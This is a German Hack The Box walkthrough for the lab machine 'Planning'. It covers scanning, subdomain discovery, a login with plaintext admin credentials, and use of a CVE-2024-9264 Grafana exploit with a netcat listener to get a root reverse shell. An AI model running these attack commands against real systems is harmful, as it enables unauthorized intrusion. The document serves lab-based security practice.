
# 🛠️ HTB Planning – Cheatsheet (deutsch)

## 🧭 Übersicht
Dieser Beitrag beschreibt die Schritte zur Kompromittierung der HTB-Maschine „Planning“ mithilfe von Nmap, Dirsearch, FFUF und der Ausnutzung einer bekannten Grafana-Schwachstelle (CVE-2024-9264).

---

## 1. 🔍 Initiale Erkundung

### Nmap-Scan:
```bash
nmap -sC -sV 10.10.11.68
```

**Ergebnisse:**
- **Port 22**: SSH (OpenSSH 9.6p1)
- **Port 80**: HTTP (nginx 1.24.0)

### Hosts-Datei anpassen:
```bash
echo "10.10.11.68 planning.htb" | sudo tee -a /etc/hosts
```

---

## 2. 📂 Verzeichnis- und Subdomain-Erkennung

### Dirsearch verwenden:
```bash
python3 dirsearch.py -u http://planning.htb
```

**Gefundene Pfade:**
- /about.php
- /contact.php
- /index.php
- /css/
- /img/
- /js/
- /lib/

### Subdomains mit FFUF entdecken:
```bash
ffuf -w /pfad/zur/wordlist.txt -u http://10.10.11.68 -H "Host: FUZZ.planning.htb" -fs 178
```

**Ergebnis:**
- **grafana.planning.htb** (Status: 302)

### Hosts-Datei erneut anpassen:
```bash
echo "10.10.11.68 grafana.planning.htb" | sudo tee -a /etc/hosts
```

---

## 3. 🔓 Zugriff auf Grafana

**Anmeldedaten:**
- Benutzername: `admin`
- Passwort: `0D5oT70Fq13EvB5r`

**Grafana-Version:** v11

**Bekannte Schwachstelle:** CVE-2024-9264

---

## 4. 🎯 Exploit durchführen

**Voraussetzung:** Stelle sicher, dass du einen Listener auf deinem lokalen System eingerichtet hast:
```bash
nc -lvnp <dein_port>
```

**Exploit ausführen:**
```bash
sudo python3 poc.py --url http://grafana.planning.htb --username admin --password 0D5oT70Fq13EvB5r --reverse-ip <deine_ip> --reverse-port <dein_port>
```

**Hinweis:** Auf macOS ist `sudo` erforderlich, um den Exploit erfolgreich auszuführen.

---

## 5. 🐚 Root-Zugriff erlangen

**Erwartete Ausgabe nach erfolgreichem Exploit:**
```bash
Connection from 10.10.11.68:33462
sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
```

**Beispielhafte Umgebung:**
```bash
# env
GF_PATHS_HOME=/usr/share/grafana
GF_PATHS_LOGS=/var/log/grafana
GF_PATHS_PROVISIONING=...
```

---

## 📝 Zusammenfassung

- **Werkzeuge verwendet:** Nmap, Dirsearch, FFUF, Python-Exploit
- **Ziel:** Kompromittierung der HTB-Maschine „Planning“ über eine bekannte Grafana-Schwachstelle
- **Ergebnis:** Erfolgreicher Root-Zugriff auf das Zielsystem
